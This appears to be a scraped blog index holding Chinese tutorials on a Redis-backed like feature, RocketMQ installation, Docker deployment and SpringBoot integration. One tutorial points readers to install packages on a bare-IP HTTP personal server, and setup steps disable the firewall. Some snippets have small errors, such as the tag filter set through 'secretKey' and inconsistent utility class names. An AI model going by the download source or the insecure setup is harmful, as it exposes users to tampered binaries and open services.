redisTemplate.opsForHash().increment(RedisKeyUtils.MAP_KEY_USER_LIKED_COUNT, likedUserId, 1); } @Override public void decrementLikedCount(String likedUserId) { redisTemplate.opsForHash().increment(RedisKeyUtils.MAP_KEY_USER_LIKED_COUNT, likedUserId, -1); } @Override public List&lt;UserLike&gt; getLikedDataFromRedis() { Cursor&lt;Map.Entry&lt;Object, Object&gt;&gt; cursor = redisTemplate.opsForHash().scan(RedisKeyUtils.MAP_KEY_USER_LIKED, ScanOptions.NONE); List&lt;UserLike&gt; list = new ArrayList&lt;&gt;(); while (cursor.hasNext()){ Map.Entry&lt;Object, Object&gt; entry = cursor.next(); String key = (String) entry.getKey(); //分离出 likedUserId，likedPostId String[] split = key.split(&quot;::&quot;); String likedUserId = split[0]; String likedPostId = split[1]; Integer value = (Integer) entry.getValue(); //组装成 UserLike 对象 UserLike userLike = new UserLike(likedUserId, likedPostId, value); list.add(userLike); //存到 list 后从 Redis 中删除 redisTemplate.opsForHash().delete(RedisKeyUtils.MAP_KEY_USER_LIKED, key); } return list; } @Override public List&lt;LikedCountDTO&gt; getLikedCountFromRedis() { Cursor&lt;Map.Entry&lt;Object, Object&gt;&gt; cursor = redisTemplate.opsForHash().scan(RedisKeyUtils.MAP_KEY_USER_LIKED_COUNT, ScanOptions.NONE); List&lt;LikedCountDTO&gt; list = new ArrayList&lt;&gt;(); while (cursor.hasNext()){ Map.Entry&lt;Object, Object&gt; map = cursor.next(); //将点赞数量存储在 LikedCountDT String key = (String)map.getKey(); LikedCountDTO dto = new LikedCountDTO(key, (Integer) map.getValue()); list.add(dto); //从Redis中删除这条记录 redisTemplate.opsForHash().delete(RedisKeyUtils.MAP_KEY_USER_LIKED_COUNT, key); } return list; }} 用到的工具类和枚举类 RedisKeyUtils, 用于根据一定规则生成 key 123456789101112131415161718192021public class RedisKeyUtils { //保存用户点赞数据的key public static final String MAP_KEY_USER_LIKED = &quot;MAP_USER_LIKED&quot;; //保存用户被点赞数量的key public static final String MAP_KEY_USER_LIKED_COUNT = &quot;MAP_USER_LIKED_COUNT&quot;; /** * 拼接被点赞的用户id和点赞的人的id作为key。格式 222222::333333 * @param likedUserId 被点赞的人id * @param likedPostId 点赞的人的id * @return */ public static String getLikedKey(String likedUserId, String likedPostId){ StringBuilder builder = new StringBuilder(); builder.append(likedUserId); builder.append(&quot;::&quot;); builder.append(likedPostId); return builder.toString(); }} LikedStatusEnum 用户点赞状态的枚举类 12345678910111213141516171819202122package com.solo.coderiver.user.enums;import lombok.Getter;/** * 用户点赞的状态 */@Getterpublic enum LikedStatusEnum { LIKE(1, &quot;点赞&quot;), UNLIKE(0, &quot;取消点赞/未点赞&quot;), ; private Integer code; private String msg; LikedStatusEnum(Integer code, String msg) { this.code = code; this.msg = msg; }} # 二、数据库设计 数据库表中至少要包含三个字段：被点赞用户 id，点赞用户 id，点赞状态。再加上主键 id，创建时间，修改时间就行了。 建表语句 1234567891011create table `user_like`( `id` int not null auto_increment, `liked_user_id` varchar(32) not null comment '被点赞的用户id', `liked_post_id` varchar(32) not null comment '点赞的用户id', `status` tinyint(1) default '1' comment '点赞状态，0取消，1点赞', `create_time` timestamp not null default current_timestamp comment '创建时间', `update_time` timestamp not null default current_timestamp on update current_timestamp comment '修改时间', primary key(`id`), INDEX `liked_user_id`(`liked_user_id`), INDEX `liked_post_id`(`liked_post_id`)) comment '用户点赞表'; 对应的对象 UserLike 1234567891011121314151617181920212223242526272829303132333435363738import com.solo.coderiver.user.enums.LikedStatusEnum;import lombok.Data;import javax.persistence.Entity;import javax.persistence.GeneratedValue;import javax.persistence.GenerationType;import javax.persistence.Id;/** * 用户点赞表 */@Entity@Datapublic class UserLike { //主键id @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private Integer id; //被点赞的用户的id private String likedUserId; //点赞的用户的id private String likedPostId; //点赞的状态.默认未点赞 private Integer status = LikedStatusEnum.UNLIKE.getCode(); public UserLike() { } public UserLike(String likedUserId, String likedPostId, Integer status) { this.likedUserId = likedUserId; this.likedPostId = likedPostId; this.status = status; }} # 三、数据库操作 操作数据库同样封装在接口中 LikedService 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import com.solo.coderiver.user.dataobject.UserLike;import org.springframework.data.domain.Page;import org.springframework.data.domain.Pageable;import java.util.List;public interface LikedService { /** * 保存点赞记录 * @param userLike * @return */ UserLike save(UserLike userLike); /** * 批量保存或修改 * @param list */ List&lt;UserLike&gt; saveAll(List&lt;UserLike&gt; list); /** * 根据被点赞人的id查询点赞列表（即查询都谁给这个人点赞过） * @param likedUserId 被点赞人的id * @param pageable * @return */ Page&lt;UserLike&gt; getLikedListByLikedUserId(String likedUserId, Pageable pageable); /** * 根据点赞人的id查询点赞列表（即查询这个人都给谁点赞过） * @param likedPostId * @param pageable * @return */ Page&lt;UserLike&gt; getLikedListByLikedPostId(String likedPostId, Pageable pageable); /** * 通过被点赞人和点赞人id查询是否存在点赞记录 * @param likedUserId * @param likedPostId * @return */ UserLike getByLikedUserIdAndLikedPostId(String likedUserId, String likedPostId); /** * 将Redis里的点赞数据存入数据库中 */ void transLikedFromRedis2DB(); /** * 将Redis中的点赞数量数据存入数据库 */ void transLikedCountFromRedis2DB();} LikedServiceImpl 实现类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990import com.solo.coderiver.user.dataobject.UserInfo;import com.solo.coderiver.user.dataobject.UserLike;import com.solo.coderiver.user.dto.LikedCountDTO;import com.solo.coderiver.user.enums.LikedStatusEnum;import com.solo.coderiver.user.repository.UserLikeRepository;import com.solo.coderiver.user.service.LikedService;import com.solo.coderiver.user.service.RedisService;import com.solo.coderiver.user.service.UserService;import lombok.extern.slf4j.Slf4j;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.data.domain.Page;import org.springframework.data.domain.Pageable;import org.springframework.stereotype.Service;import org.springframework.transaction.annotation.Transactional;import java.util.List;@Service@Slf4jpublic class LikedServiceImpl implements LikedService { @Autowired UserLikeRepository likeRepository; @Autowired RedisService redisService; @Autowired UserService userService; @Override @Transactional public UserLike save(UserLike userLike) { return likeRepository.save(userLike); } @Override @Transactional public List&lt;UserLike&gt; saveAll(List&lt;UserLike&gt; list) { return likeRepository.saveAll(list); } @Override public Page&lt;UserLike&gt; getLikedListByLikedUserId(String likedUserId, Pageable pageable) { return likeRepository.findByLikedUserIdAndStatus(likedUserId, LikedStatusEnum.LIKE.getCode(), pageable); } @Override public Page&lt;UserLike&gt; getLikedListByLikedPostId(String likedPostId, Pageable pageable) { return likeRepository.findByLikedPostIdAndStatus(likedPostId, LikedStatusEnum.LIKE.getCode(), pageable); } @Override public UserLike getByLikedUserIdAndLikedPostId(String likedUserId, String likedPostId) { return likeRepository.findByLikedUserIdAndLikedPostId(likedUserId, likedPostId); } @Override @Transactional public void transLikedFromRedis2DB() { List&lt;UserLike&gt; list = redisService.getLikedDataFromRedis(); for (UserLike like : list) { UserLike ul = getByLikedUserIdAndLikedPostId(like.getLikedUserId(), like.getLikedPostId()); if (ul == null){ //没有记录，直接存入 save(like); }else{ //有记录，需要更新 ul.setStatus(like.getStatus()); save(ul); } } } @Override @Transactional public void transLikedCountFromRedis2DB() { List&lt;LikedCountDTO&gt; list = redisService.getLikedCountFromRedis(); for (LikedCountDTO dto : list) { UserInfo user = userService.findById(dto.getId()); //点赞数量属于无关紧要的操作，出错无需抛异常 if (user != null){ Integer likeNum = user.getLikeNum() + dto.getCount(); user.setLikeNum(likeNum); //更新点赞数量 userService.updateInfo(user); } } }} 数据库的操作就这些，主要还是增删改查。 # 四、开启定时任务持久化存储到数据库 定时任务 Quartz 很强大，就用它了。 Quartz 使用步骤： 添加依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-quartz&lt;/artifactId&gt;&lt;/dependency&gt;复制代码 编写配置文件 1234567891011121314151617181920212223242526272829package com.solo.coderiver.user.config;import com.solo.coderiver.user.task.LikeTask;import org.quartz.*;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class QuartzConfig { private static final String LIKE_TASK_IDENTITY = &quot;LikeTaskQuartz&quot;; @Bean public JobDetail quartzDetail(){ return JobBuilder.newJob(LikeTask.class).withIdentity(LIKE_TASK_IDENTITY).storeDurably().build(); } @Bean public Trigger quartzTrigger(){ SimpleScheduleBuilder scheduleBuilder = SimpleScheduleBuilder.simpleSchedule()// .withIntervalInSeconds(10) //设置时间周期单位秒 .withIntervalInHours(2) //两个小时执行一次 .repeatForever(); return TriggerBuilder.newTrigger().forJob(quartzDetail()) .withIdentity(LIKE_TASK_IDENTITY) .withSchedule(scheduleBuilder) .build(); }} 编写执行任务的类继承自 QuartzJobBean 1234567891011121314151617181920212223242526272829303132333435package com.solo.coderiver.user.task;import com.solo.coderiver.user.service.LikedService;import lombok.extern.slf4j.Slf4j;import org.apache.commons.lang.time.DateUtils;import org.quartz.JobExecutionContext;import org.quartz.JobExecutionException;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.scheduling.quartz.QuartzJobBean;import java.text.SimpleDateFormat;import java.util.Date;/** * 点赞的定时任务 */@Slf4jpublic class LikeTask extends QuartzJobBean { @Autowired LikedService likedService; private SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;); @Override protected void executeInternal(JobExecutionContext jobExecutionContext) throws JobExecutionException { log.info(&quot;LikeTask-------- {}&quot;, sdf.format(new Date())); //将 Redis 里的点赞信息同步到数据库里 likedService.transLikedFromRedis2DB(); likedService.transLikedCountFromRedis2DB(); }} 在定时任务中直接调用 LikedService 封装的方法完成数据同步。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/02/14/%E3%80%90Redis%E3%80%91SpringBoot+Redis%E5%AE%9E%E7%8E%B0%E9%AB%98%E6%80%A7%E8%83%BD%EF%BC%8C%E5%BC%BA%E6%94%AF%E6%8C%81%E7%9A%84%E7%82%B9%E8%B5%9E-%E6%9F%A5%E7%9C%8B%E6%94%B6%E8%97%8F%E6%B5%81%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"title":"RocketMQ","text":"# RocketMQ # 应用场景 异步解藕 削峰填谷 消息分发 # 环境搭建 上传 rocketmq-all-4.4.0-bin-release.zip 到家目录 使用解压命令进行解压 1unzip /usr/local/rocketmq-all-4.4.0-bin-release.zip 软件重命名 1mv /usr/local/rocketmq-all-4.4.0-bin-release/ /usr/local/rocketmq-4.4/ 修改启动参数配置 JAVA_OPT=”${JAVA_OPT} -server -Xms1g -Xmx1g -Xmn1g“ 两个文件 123vi /usr/local/rocketmq-4.4/bin/runbroker.shvi /usr/local/rocketmq-4.4/bin/runserver.sh 启动名字服务和代理服务 12345nohup sh /usr/local/rocketmq-4.4/bin/mqnamesrv &amp;# -n localhost:9876 指定名称服务的地址, 类似于zk的地址nohup sh /usr/local/rocketmq-4.4/bin/mqbroker -n localhost:9876 -c /usr/local/rocketmq-4.4/conf/broker.conf &amp; 检验是否启动正常 使用 java 的内置命令: jps 可以看到 BrokerStartup 和 NamesrvStartup 进程 使用 Linux 命令 **: netstat-ntlp 可以看到 9876 的端口和 10911 的端口 ** 使用 ps-ef |grep java 查看启动日志: tail -100f ~/logs/rocketmqlogs/namesrv.log tail -100f ~/logs/rocketmqlogs/broker.log 关闭 RocketMQ 1234567# 1.关闭NameServersh /usr/local/rocketmq-4.4/bin/mqshutdown namesrv# 2.关闭Brokersh /usr/local/rocketmq-4.4/bin/mqshutdown broker # 编写 sh 脚本文件 启动 (startRocketMQ.sh) 123456789# !/bin/bashecho '------------------rocketmq-nameServer-starter-------------------------' nohup sh /usr/local/rocketmq-4.4/bin/mqnamesrv &amp;echo '------------------rocketmq-nameServer-started-------------------------'echo '------------------rocketmq-brokerServer-starter-----------------------' nohup sh /usr/local/rocketmq-4.4/bin/mqbroker -n localhost:9876 -c /usr/local/rocketmq-4.4/conf/broker.conf &amp;echo '------------------rocketmq-brokerServer-started-----------------------' 关闭 (stutdownRocketMQ.sh) 123456789# !/bin/bashecho '------------------rocketmq-nameServer-shutdown-------------------------' sh /usr/local/rocketmq-4.4/bin/mqshutdown namesrvecho '------------------rocketmq-nameServer-shutdowned-------------------------'echo '------------------rocketmq-brokerServer-shutdown-----------------------' sh /usr/local/rocketmq-4.4/bin/mqshutdown brokerecho '------------------rocketmq-brokerServer-shutdowned-----------------------' # 监控平台 使用 jar 1nohup java -jar rocketmq-console-ng-1.0.1.jar &amp; # SpringBoot 集成 # 依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.rocketmq&lt;/groupId&gt; &lt;artifactId&gt;rocketmq-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.3&lt;/version&gt;&lt;/dependency&gt; # 配置 生产者 12rocketmq.name-server=127.0.0.1:9876rocketmq.producer.group=my-group 消费者 1rocketmq.name-server=127.0.0.1:9876 # 编码 生产者 1234567891011121314@RestControllerpublic class HelloController { @Autowired private RocketMQTemplate rocketMQTemplate; @RequestMapping(&quot;01-hello&quot;) public String sendMsg(String message,String age) throws Exception{ //发送消息 SendResult sendResult = rocketMQTemplate.syncSend(&quot;01-boot:&quot;, message); System.out.println(sendResult.getMsgId()); System.out.println(sendResult.getSendStatus()); return &quot;success&quot;; }} 消费者 1234567891011@Component@RocketMQMessageListener( topic = &quot;01-boot&quot;, consumerGroup = &quot;wolfcode-consumer&quot;)public class HelloConsumer implements RocketMQListener&lt;MessageExt&gt; { @Override public void onMessage(MessageExt messageExt) { System.out.println(&quot;消费消息&quot;+messageExt); }} # 发送消息方式 (生产者) # 发送类型 同步消息 123SendResult sendResult = rocketMQTemplate.syncSend(&quot;020-boot&quot;, msg);System.out.println(sendResult.getMsgId());System.out.println(sendResult.getSendStatus()); 异步消息 123456789101112rocketMQTemplate.asyncSend(&quot;020-boot&quot;, msg, new SendCallback() { @Override public void onSuccess(SendResult sendResult) { System.out.println(sendResult.getMsgId()); System.out.println(sendResult.getSendStatus()); } @Override public void onException(Throwable throwable) { System.out.println(throwable); } }); 一次性消息 1rocketMQTemplate.sendOneWay(&quot;020-boot&quot;, msg); # 发送时间 默认立即发送 延时发送 12// 参数1:主题 2:消息 3:rocket发送最大允许时间 4:延时级别(18级)SendResult sendResult = rocketMQTemplate.syncSend(&quot;020-boot&quot;, MessageBuilder.withPayload(msg).build(),100000,3); # 消费模式 (消费者) 以组为单位 默认为集群模式 集群模式 (每组只有一个可以收到) 12345678910111213@Component@RocketMQMessageListener( topic = &quot;020-boot&quot;, messageModel = MessageModel.CLUSTERING, consumerGroup = &quot;wolfcode-consumer&quot;)public class MqListenner implements RocketMQListener&lt;String&gt; { @Override public void onMessage(String s) { System.out.println(&quot;今天上映:&quot;+s); }} 广播模式 (每组的所有消费者都可以收到) 12345678910111213@Component@RocketMQMessageListener( topic = &quot;020-boot&quot;, messageModel = MessageModel.BROADCASTING, consumerGroup = &quot;wolfcode-consumer&quot;)public class MqListenner implements RocketMQListener&lt;String&gt; { @Override public void onMessage(String s) { System.out.println(&quot;今天上映:&quot;+s); }} # 消息过滤 # Tag 标签模式 在发送的消息 Topic:Tag 中间使用冒号隔开 生产者 12345@RequestMapping(&quot;/sendTagMsg&quot;)public String sendTagMsg(String msg) { rocketMQTemplate.convertAndSend(&quot;020-boot:TagB&quot;,msg); return &quot;success&quot;;} 消费者 1234567891011121314@Component@RocketMQMessageListener( topic = &quot;020-boot&quot;, selectorType = SelectorType.TAG, //接收TagB或TagA secretKey = &quot;TagB || TagA&quot;, consumerGroup = &quot;wolfcode-consumer&quot;)public class MqListenner implements RocketMQListener&lt;String&gt; { @Override public void onMessage(String s) { System.out.println(&quot;今天上映:&quot;+s); }} # SQL92 过滤 注意：在使用 SQL 过滤的时候，需要配置参数 enablePropertyFilter=true 生产者 123456789101112//Sql92过滤@RequestMapping(&quot;/sendSQLMsg&quot;)public String sendSQLMsg(int age,String msg) { Map&lt;String,Object&gt; map=new HashMap&lt;&gt;(); //用户自定义属性 map.put(&quot;age&quot;, age); map.put(&quot;name&quot;, &quot;hesj&quot;); //也可以设置系统属性 map.put(MessageConst.PROPERTY_KEYS,age); template.convertAndSend(&quot;02-RocketMQ-Top7&quot;,msg,map); return &quot;success&quot;;} 消费者 1234567891011121314@Component@RocketMQMessageListener( topic = &quot;02-RocketMQ-Top7&quot;, messageModel = MessageModel.CLUSTERING, selectorType = SelectorType.SQL92, selectorExpression = &quot;age &gt; 16&quot;, consumerGroup= &quot;wolfcode-consumer7&quot;)public class MqListiner7 implements RocketMQListener&lt;String&gt; { @Override public void onMessage(String msg) { System.out.println(&quot;消费消息SQl92&quot;+msg); }} # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/03/08/%E3%80%90RocketMQ%E3%80%91RocketMQ/"},{"title":"Docker环境下部署RocketMQ以及Console","text":"# Docker 环境下部署 RocketMQ 以及 Console # 1.docker 安装 rocketmq 镜像 123#拉取镜像 docker pull foxiswho/rocketmq:server-4.7.0docker pull foxiswho/rocketmq:broker-4.7.0 # 2. 创建 server 和 broker 目录，并在目录 /opt 下创建 broker.conf 1234567891011121314#创建目录mkdir /opt/rocketmq-servermkdir /opt/rocketmq-broker/conf -p[root@localhost opt]# cat /opt/rocketmq-broker/conf/broker.conf namesrvAddr=【你的IP地址】:9876brokerClusterName = DefaultClusterbrokerName = broker-abrokerId = 0deleteWhen = 04fileReservedTime = 48brokerRole = ASYNC_MASTERflushDiskType = ASYNC_FLUSHbrokerIP1 = 【你的IP地址】listenPort=10911 # 3. 启动容器并在防火墙放行端口 9876 、10911 、11011 123456789101112131415161718192021222324252627282930313233343536RocketMQ默认使用3个端口：9876 、10911 、11011如果防火墙没有关闭的话，那么防火墙就必须开放这些端口：nameserver 默认使用 9876 端口master 默认使用 10911 端口slave 默认使用11011 端口#启动rocketmq-serverdocker run -d \\--restart=always \\--name rmqnamesrv \\-p 9876:9876 \\-v /opt/rocketmq-server/logs:/root/logs \\-v /opt/rocketmq-server/store:/root/store \\-e &quot;MAX_POSSIBLE_HEAP=100000000&quot; \\foxiswho/rocketmq:4.7.0 \\sh mqnamesrv#启动rocketmq-brokerdocker run -d \\--restart=always \\--name rmqbroker \\--link rmqnamesrv:namesrv \\-p 10911:10911 \\-p 10909:10909 \\-v /opt/rocketmq-broker/logs:/root/logs \\-v /opt/rocketmq-broker/store:/root/store \\-v /opt/rocketmq-broker/conf/broker.conf:/opt/rocketmq-broker/conf/broker.conf \\-e &quot;NAMESRV_ADDR=【你的IP地址】:9876&quot; \\-e &quot;MAX_POSSIBLE_HEAP=200000000&quot; \\-e &quot;autoCreateTopicEnable=true&quot; \\foxiswho/rocketmq:4.7.0 \\sh mqbroker -c /opt/rocketmq-broker/conf/broker.conf#启动RocketMQ的管理工具rocketmq-consoledocker run -itd -e &quot;JAVA_OPTS=-Drocketmq.namesrv.addr=【你的IP地址】:9876 -Dcom.rocketmq.sendMessageWithVIPChannel=false&quot; -p 9877:8080 -t styletang/rocketmq-console-ng:latest # 4. 测试访问 console 控制台 浏览器输入：192.168.1.200:9877 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2020/12/16/%E3%80%90RocketMQ%E3%80%91Docker%E7%8E%AF%E5%A2%83%E4%B8%8B%E9%83%A8%E7%BD%B2RocketMQ%E4%BB%A5%E5%8F%8AConsole/"},{"title":"docker简单部署rocketMQ","text":"# docker 简单部署 rocketMQ 1. 创建 namesrv 服务 拉取镜像 1docker pull rocketmqinc/rocketmq # 创建 namesrv 数据存储路径 1mkdir -p /docker/rocketmq/data/namesrv/logs /docker/rocketmq/data/namesrv/store # 构建 namesrv 容器 123456789docker run -d \\--restart=always \\--name rmqnamesrv \\-p 9876:9876 \\-v /docker/rocketmq/data/namesrv/logs:/root/logs \\-v /docker/rocketmq/data/namesrv/store:/root/store \\-e &quot;MAX_POSSIBLE_HEAP=100000000&quot; \\rocketmqinc/rocketmq \\sh mqnamesrv # 2. 创建 broker 节点 # 创建 broker 数据存储路径 1mkdir -p /docker/rocketmq/data/broker/logs /docker/rocketmq/data/broker/store /docker/rocketmq/conf # 创建配置文件 1234567891011121314151617181920vi /docker/rocketmq/conf/broker.conf# 所属集群名称，如果节点较多可以配置多个brokerClusterName = DefaultCluster#broker名称，master和slave使用相同的名称，表明他们的主从关系brokerName = broker-a#0表示Master，大于0表示不同的slavebrokerId = 0#表示几点做消息删除动作，默认是凌晨4点deleteWhen = 04#在磁盘上保留消息的时长，单位是小时fileReservedTime = 48#有三个值：SYNC_MASTER，ASYNC_MASTER，SLAVE；同步和异步表示Master和Slave之间同步数据的机制；brokerRole = ASYNC_MASTER#刷盘策略，取值为：ASYNC_FLUSH，SYNC_FLUSH表示同步刷盘和异步刷盘；SYNC_FLUSH消息写入磁盘后才返回成功状态，ASYNC_FLUSH不需要；flushDiskType = ASYNC_FLUSH# 磁盘使用达到95%之后,生产者再写入消息会报错 CODE: 14 DESC: service not available now, maybe disk fulldiskMaxUsedSpaceRatio=95namesrvAddr=【IP】:9876brokerIP1 = 【IP】 # 构建 broker 容器 12345678910111213141516docker run -d \\--restart=always \\--name rmqbroker \\--link rmqnamesrv:namesrv \\-p 10911:10911 \\-p 10912:10912 \\-p 10909:10909 \\-v /docker/rocketmq/data/broker/logs:/root/logs \\-v /docker/rocketmq/data/broker/store:/root/store \\-v /docker/rocketmq/conf/broker.conf:/opt/rocketmq-4.4.0/conf/broker.conf \\-e &quot;NAMESRV_ADDR= 【你的IP地址】:9876&quot; \\-e &quot;MAX_POSSIBLE_HEAP=200000000&quot; \\rocketmqinc/rocketmq \\sh mqbroker -c /opt/rocketmq-4.4.0/conf/broker.conf # 3. 创建 rockermq-console 服务 # 拉取镜像 1docker pull pangliang/rocketmq-console-ng # 构建 rockermq-console 容器 12345678docker run -d \\--restart=always \\--name rmqadmin \\-e &quot;JAVA_OPTS=-Drocketmq.namesrv.addr=【你的IP地址】:9876 \\-Dcom.rocketmq.sendMessageWithVIPChannel=false&quot; \\-p 9877:8080 \\pangliang/rocketmq-console-ng # 关闭防火墙 1systemctl stop firewalld.service # 开放指定端口 123456firewall-cmd --permanent --zone=public --add-port=9876/tcpfirewall-cmd --permanent --zone=public --add-port=10911/tcpfirewall-cmd --permanent --zone=public --add-port=10912/tcp# 立即生效firewall-cmd --reload # 访问控制台 网页访问 http://【IP】:9999 / 查看控制台信息 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/05/01/%E3%80%90RocketMQ%E3%80%91docker%E7%AE%80%E5%8D%95%E9%83%A8%E7%BD%B2rocketMQ/"},{"title":"RocketMQ - 十年双十一并发神器，最好的消息队列 Linux下安装与部署&amp;SpringBoot简单应用","text":"# RocketMQ 4.4.0 下载 作者已经在自己的服务器挂载了 RocketMQ 4.4.0 的安装包和控制台，点击链接下载 rocketMQ 4.4.0 安装包 http://124.222.229.230:8080/rocketmq-all-4.4.0-bin-release.zip rocketMQ 控制台 安装包 http://124.222.229.230:8080/rocketmq-externals-rocketmq-console-1.0.0.zip 在使用前如果整合微服务，请注意 SpringCloudAliabba 与各组件之间的版本对应关系 作者使用 SpringCloudAlibaba 2.2.5 RELEASE 版本，所以对应使用 RocketMQ 4.4.0 版本 将下载好的安装包上传至 Linux 服务器 将压缩包解压至创建好的 rocketMQ 文件夹下 1unzip rocketmq-all-4.4.0-bin-release.zip rocketMQ 按照官网流程，启动 nameServer，brokerServer 服务 # 启动 nameServer 1234#启动服务nohup ./mqnamesrv -n 124.222.229.230:9876 &amp;#查看日志tail -f ~/logs/rocketmqlogs/namesrv.log # 启动 brokerServer 1234#启动服务nohup ./mqbroker -n 124.222.229.230:9876 -c ../conf/broker.conf autoCreateTopicEnable=true &amp;#查看日志tail -f ~/logs/rocketmqlogs/broker.log # 发送消息测试 1sh bin/tools.sh org.apache.rocketmq.example.quickstart.Producer # 消费消息测试 1sh bin/tools.sh org.apache.rocketmq.example.quickstart.Consumer # SpringBoot 整合 pom.xml 添加 123456&lt;dependency&gt; &lt;groupId&gt;org.apache.rocketmq&lt;/groupId&gt; &lt;artifactId&gt;rocketmq-spring-boot&lt;/artifactId&gt; &lt;version&gt;2.0.4&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt;&lt;/dependency&gt; # 封装工具： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177package cn.brath.common.rocketmq;import org.apache.rocketmq.client.producer.SendCallback;import org.apache.rocketmq.client.producer.SendResult;import org.apache.rocketmq.spring.core.RocketMQTemplate;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.messaging.Message;import org.springframework.stereotype.Component;import javax.annotation.PostConstruct;import javax.annotation.PreDestroy;/** * @Auther: Brath * Create By Administrator on 2022/3/31 13:59 * Strive to create higher performance code * @My wechat: 17604868415 * @My QQ: 2634490675 * @My email 1: email_ guoqing@163.com * @My email 2: enjoy_ light_ sports@163.com * @PPseudonym: enjoy sports nutrition * @Program body: enjoy notes */@Componentpublic class RocketMQUtil { /** * SLF4J日志 */ private static final Logger logger = LoggerFactory.getLogger(RocketMQUtil.class); /** * rocketmq模板注入 */ @Autowired private RocketMQTemplate rocketMQTemplate; @PostConstruct public void init() { logger.info(&quot;---RocketMq工具初始化---&quot;); } /** * 发送异步消息 * * @param topic 消息Topic * @param message 消息实体 */ public void asyncSend(Enum topic, Message&lt;?&gt; message) { asyncSend(topic.name(), message, getDefaultSendCallBack()); } /** * 发送异步消息 * * @param topic 消息Topic * @param message 消息实体 * @param sendCallback 回调函数 */ public void asyncSend(Enum topic, Message&lt;?&gt; message, SendCallback sendCallback) { asyncSend(topic.name(), message, sendCallback); } /** * 发送异步消息 * * @param topic 消息Topic * @param message 消息实体 */ public void asyncSend(String topic, Message&lt;?&gt; message) { rocketMQTemplate.asyncSend(topic, message, getDefaultSendCallBack()); } /** * 发送异步消息 * * @param topic 消息Topic * @param message 消息实体 * @param sendCallback 回调函数 */ public void asyncSend(String topic, Message&lt;?&gt; message, SendCallback sendCallback) { rocketMQTemplate.asyncSend(topic, message, sendCallback); } /** * 发送异步消息 * * @param topic 消息Topic * @param message 消息实体 * @param sendCallback 回调函数 * @param timeout 超时时间 */ public void asyncSend(String topic, Message&lt;?&gt; message, SendCallback sendCallback, long timeout) { rocketMQTemplate.asyncSend(topic, message, sendCallback, timeout); } /** * 发送异步消息 * * @param topic 消息Topic * @param message 消息实体 * @param sendCallback 回调函数 * @param timeout 超时时间 * @param delayLevel 延迟消息的级别 */ public void asyncSend(String topic, Message&lt;?&gt; message, SendCallback sendCallback, long timeout, int delayLevel) { rocketMQTemplate.asyncSend(topic, message, sendCallback, timeout, delayLevel); } /** * 发送顺序消息 * * @param message * @param topic * @param hashKey */ public void syncSendOrderly(Enum topic, Message&lt;?&gt; message, String hashKey) { syncSendOrderly(topic.name(), message, hashKey); } /** * 发送顺序消息 * * @param message * @param topic * @param hashKey */ public void syncSendOrderly(String topic, Message&lt;?&gt; message, String hashKey) { logger.info(&quot;发送顺序消息，topic:&quot; + topic + &quot;,hashKey:&quot; + hashKey); rocketMQTemplate.syncSendOrderly(topic, message, hashKey); } /** * 发送顺序消息 * * @param message * @param topic * @param hashKey * @param timeout */ public void syncSendOrderly(String topic, Message&lt;?&gt; message, String hashKey, long timeout) { logger.info(&quot;发送顺序消息，topic:&quot; + topic + &quot;,hashKey:&quot; + hashKey + &quot;,timeout:&quot; + timeout); rocketMQTemplate.syncSendOrderly(topic, message, hashKey, timeout); } /** * 默认CallBack函数 * * @return */ private SendCallback getDefaultSendCallBack() { return new SendCallback() { @Override public void onSuccess(SendResult sendResult) { logger.info(&quot;---发送MQ成功---&quot;); } @Override public void onException(Throwable throwable) { throwable.printStackTrace(); logger.error(&quot;---发送MQ失败---&quot;+throwable.getMessage(), throwable.getMessage()); } }; } @PreDestroy public void destroy() { logger.info(&quot;---RocketMq工具注销---&quot;); }} 测试发送消息 1234567891011@Autowired private RocketMqUtil rocketMqutil; @Test public void Producter() { User user = new User(); user.setName(&quot;brath&quot;); user.setAge(10); rocketMqHelper.asyncSend(&quot;REGIST_USER&quot;, MessageBuilder.withPayload(user).build()); } 测试消费消息 1234567891011121314151617181920212223242526package com.hyh.core.listener;import com.hyh.core.po.Person;import org.apache.rocketmq.spring.annotation.RocketMQMessageListener;import org.apache.rocketmq.spring.core.RocketMQListener;import org.springframework.stereotype.Component;/** * @Auther: Brath * Create By Administrator on 2022/3/31 13:59 * Strive to create higher performance code * @My wechat: 17604868415 * @My QQ: 2634490675 * @My email 1: email_ guoqing@163.com * @My email 2: enjoy_ light_ sports@163.com * @PPseudonym: enjoy sports nutrition * @Program body: enjoy notes 